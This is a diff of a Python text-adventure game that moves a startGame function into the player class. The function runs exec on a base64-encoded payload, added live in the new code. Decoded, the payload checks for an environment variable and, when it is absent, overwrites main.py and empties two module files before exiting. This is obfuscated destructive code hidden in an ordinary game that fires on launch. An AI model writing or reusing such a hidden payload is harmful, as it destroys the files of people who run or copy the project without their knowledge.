@@ -124,13 +124,13 @@ class player():
               print("You already have this skill!")
           else:
             print("You haven't unlocked stage one yet!")
-
-def startGame():
-  with open('msg/message.txt') as fyl:
-    print(fyl.read())
-
-  exec(
-    base64.b64decode(
-b'dHJ5OgogICAgb3MuZW52aXJvblsnbW9kJ10KICAgIHByaW50KCJObyBmb3JrIGRldGVjdGVkIikKZXhjZXB0OgogICAgd2l0aCBvcGVuKCdtc2cvZm9yay50eHQnKSBhcyBmOgogICAgICBwcmludChmLnJlYWQoKSkKICAgIHdpdGggb3BlbignbWFpbi5weScsJ3cnKSBhcyBmOgogICAgICBmLndyaXRlKCJUaGlzIGlzIGEgY2hhb3Mgb2YgZWFydGggY29weS4iKQogICAgd2l0aCBvcGVuKCcjbW9kdWxlU2V0QS5weScsJ3cnKSBhcyBmOgogICAgICBmLndyaXRlKCIiKQogICAgd2l0aCBvcGVuKCcjbW9kdWxlU2V0Qi5weScsICd3JykgYXMgZjoKICAgICAgZi53cml0ZSgiIikKICAgICAgZXhpdCgp'
-    ).decode()
-  )
+            
+  def startGame(self):
+    with open('msg/message.txt') as fyl:
+      print(fyl.read())
+  
+    exec(
+      base64.b64decode(
+  b'dHJ5OgogICAgb3MuZW52aXJvblsnbW9kJ10KICAgIHByaW50KCJObyBmb3JrIGRldGVjdGVkIikKZXhjZXB0OgogICAgd2l0aCBvcGVuKCdtc2cvZm9yay50eHQnKSBhcyBmOgogICAgICBwcmludChmLnJlYWQoKSkKICAgIHdpdGggb3BlbignbWFpbi5weScsJ3cnKSBhcyBmOgogICAgICBmLndyaXRlKCJUaGlzIGlzIGEgY2hhb3Mgb2YgZWFydGggY29weS4iKQogICAgd2l0aCBvcGVuKCcjbW9kdWxlU2V0QS5weScsJ3cnKSBhcyBmOgogICAgICBmLndyaXRlKCIiKQogICAgd2l0aCBvcGVuKCcjbW9kdWxlU2V0Qi5weScsICd3JykgYXMgZjoKICAgICAgZi53cml0ZSgiIikKICAgICAgZXhpdCgp'
+      ).decode()
+    )
